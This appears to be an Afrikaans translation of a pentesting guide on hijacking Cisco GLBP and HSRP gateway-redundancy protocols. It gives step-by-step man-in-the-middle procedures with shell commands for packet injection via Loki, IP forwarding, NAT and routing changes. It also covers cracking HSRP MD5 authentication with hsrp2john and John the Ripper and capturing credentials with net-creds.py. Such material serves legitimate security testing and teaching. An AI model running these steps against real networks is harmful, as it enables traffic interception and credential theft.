# GLBP & HSRP Aanvalle

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Oorsig

### Insigte in FHRP

FHRP is ontwerp om netwerkrobustheid te bied deur verskeie routers in 'n enkele virtuele eenheid te kombineer, wat laaiverdeling en fouttoleransie verbeter. Cisco Systems het prominente protokolle in hierdie suite bekendgestel, soos GLBP en HSRP.

### GLBP Protokol Insigte

Cisco se skepping, GLBP, funksioneer op die TCP/IP-stapel, wat UDP op poort 3222 vir kommunikasie gebruik. Routers in 'n GLBP-groep ruil "hello" pakkette uit op 3-sekonde-intervalle. As 'n router nie hierdie pakkette vir 10 sekondes kan stuur nie, word dit vermoedelik aflyn. Hierdie timers is egter nie vas nie en kan gewysig word.

### GLBP Operasies en Laaiverdeling

GLBP val op deur laaiverdeling oor routers moontlik te maak met behulp van 'n enkele virtuele IP gekoppel aan verskeie virtuele MAC-adresse. In 'n GLBP-groep is elke router betrokke by pakkie-oordrag. Anders as HSRP/VRRP, bied GLBP werklike laaibalans deur verskeie meganismes:

- **Gashere-afhanklike Laaibalans:** Handhaaf 'n konsekwente AVF MAC-adres toewysing aan 'n gasheer, noodsaaklik vir stabiele NAT-konfigurasies.
- **Rond-robin Laaibalans:** Die standaardbenadering, wat AVF MAC-adres toewysing tussen versoekende gashere afwisselend.
- **Gewigte Rond-robin Laaibalans:** Verdeel die las gebaseer op vooraf gedefinieerde "Gewig" metrieks.

### Sleutelelemente en Terminologie in GLBP

- **AVG (Aktiewe Virtuele Gateway):** Die hoofrouter, verantwoordelik vir die toewysing van MAC-adresse aan gelykwaardige routers.
- **AVF (Aktiewe Virtuele Oordragter):** 'n Router wat aangewys is om netwerkverkeer te bestuur.
- **GLBP Prioriteit:** 'n metrie wat die AVG bepaal, wat begin by 'n standaard van 100 en wissel tussen 1 en 255.
- **GLBP Gewig:** Reflekteer die huidige las op 'n router, verstelbaar of handmatig of deur Objektiewe Volg.
- **GLBP Virtuele IP Adres:** Dien as die netwerk se standaardgateway vir alle gekonnekteerde toestelle.

Vir interaksies gebruik GLBP die gereserveerde multicast adres 224.0.0.102 en UDP poort 3222. Routers stuur "hello" pakkette uit op 3-sekonde-intervalle, en word as nie-operasioneel beskou as 'n pakkie oor 'n 10-sekonde periode gemis word.

### GLBP Aanval Mekanis

'n Aanvaller kan die primêre router word deur 'n GLBP-pakkie met die hoogste prioriteitswaarde (255) te stuur. Dit kan lei tot DoS of MITM-aanvalle, wat verkeer se onderskepping of herleiding moontlik maak.

### Uitvoering van 'n GLBP Aanval met Loki

[Loki](https://github.com/raizo62/loki_on_kali) kan 'n GLBP-aanval uitvoer deur 'n pakkie met prioriteit en gewig op 255 in te spuit. Voor-aanval stappe behels die insameling van inligting soos die virtuele IP-adres, teenwoordigheid van outentisering, en router prioriteitswaardes met behulp van gereedskap soos Wireshark.

Aanval Stappe:

1. Skakel oor na promiscuous mode en stel IP-oordrag in.
2. Identifiseer die teikenrouter en verkry sy IP.
3. Genereer 'n Gratuitous ARP.
4. Spuit 'n kwaadwillige GLBP-pakkie in, wat die AVG naboots.
5. Ken 'n sekondêre IP-adres toe aan die aanvaller se netwerkinterfaan, wat die GLBP virtuele IP weerspieël.
6. Implementeer SNAT vir volledige verkeer sigbaarheid.
7. Pas routing aan om voortgesette internettoegang deur die oorspronklike AVG-router te verseker.

Deur hierdie stappe te volg, posisioneer die aanvaller hulself as 'n "man in die middel," wat in staat is om netwerkverkeer te onderskep en te analiseer, insluitend ongeënkripteerde of sensitiewe data.

Vir demonstrasie, hier is die vereiste opdrag-snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring en die onderskepping van verkeer kan gedoen word met behulp van net-creds.py of soortgelyke gereedskap om data wat deur die gecompromitteerde netwerk vloei, te vang en te analiseer.

### Passiewe Verklaring van HSRP Hijacking met Opdrag Besonderhede

#### Oorsig van HSRP (Hot Standby Router/Redundancy Protocol)

HSRP is 'n Cisco eie protokol wat ontwerp is vir netwerk gateway redundansie. Dit stel die konfigurasie van verskeie fisiese routers in 'n enkele logiese eenheid met 'n gedeelde IP-adres moontlik. Hierdie logiese eenheid word bestuur deur 'n primêre router wat verantwoordelik is vir die rigting van verkeer. Anders as GLBP, wat metrieks soos prioriteit en gewig vir lasbalansering gebruik, staat HSRP op 'n enkele aktiewe router vir verkeersbestuur.

#### Rolle en Terminologie in HSRP

- **HSRP Aktiewe Router**: Die toestel wat as die gateway optree, wat die verkeersvloei bestuur.
- **HSRP Standby Router**: 'n Rugsteunrouter, gereed om oor te neem as die aktiewe router faal.
- **HSRP Groep**: 'n Stel routers wat saamwerk om 'n enkele veerkragtige virtuele router te vorm.
- **HSRP MAC Adres**: 'n virtuele MAC adres wat aan die logiese router in die HSRP opstelling toegeken is.
- **HSRP Virtuele IP Adres**: Die virtuele IP adres van die HSRP groep, wat as die standaard gateway vir gekonnekteerde toestelle optree.

#### HSRP Weergawes

HSRP kom in twee weergawes, HSRPv1 en HSRPv2, wat hoofsaaklik verskil in groep kapasiteit, multicast IP gebruik, en virtuele MAC adres struktuur. Die protokol gebruik spesifieke multicast IP adresse vir diens inligting uitruil, met Hello pakkette wat elke 3 sekondes gestuur word. 'n Router word as inaktief beskou as daar geen pakket binne 'n 10-sekonde interval ontvang word nie.

#### HSRP Aanval Meganisme

HSRP aanvalle behels die gedwonge oorneem van die Aktiewe Router se rol deur 'n maksimum prioriteitswaarde in te spuit. Dit kan lei tot 'n Man-In-The-Middle (MITM) aanval. Belangrike voor-aanval stappe sluit in die insameling van data oor die HSRP opstelling, wat gedoen kan word met behulp van Wireshark vir verkeersanalise.

#### Stappe om HSRP Outentikasie te Omseil

1. Stoor die netwerkverkeer wat HSRP data bevat as 'n .pcap lêer.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Trek MD5 hashes uit die .pcap lêer met hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Breek die MD5 hashes met John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Voer HSRP Inspuiting uit met Loki**

1. Begin Loki om HSRP advertensies te identifiseer.
2. Stel die netwerkinterface in op promiscuous mode en stel IP forwarding in.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Gebruik Loki om die spesifieke router te teiken, voer die gekraakte HSRP wagwoord in, en voer nodige konfigurasies uit om die Aktiewe Router na te boots.
4. Nadat jy die Aktiewe Router rol verkry het, konfigureer jou netwerkinterface en IP tafels om die wettige verkeer te onderskep.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Wysig die routeringstabel om verkeer deur die voormalige Aktiewe Router te router.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Gebruik net-creds.py of 'n soortgelyke nut om akrediteer te vang uit die onderskepte verkeer.
```shell
sudo python2 net-creds.py -i eth0
```

Die uitvoering van hierdie stappe plaas die aanvaller in 'n posisie om verkeer te onderskep en te manipuleer, soortgelyk aan die prosedure vir GLBP hijacking. Dit beklemtoon die kwesbaarheid in redundansie protokolle soos HSRP en die behoefte aan robuuste sekuriteitsmaatreëls.

## Verwysings

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)


{{#include ../../banners/hacktricks-training.md}}
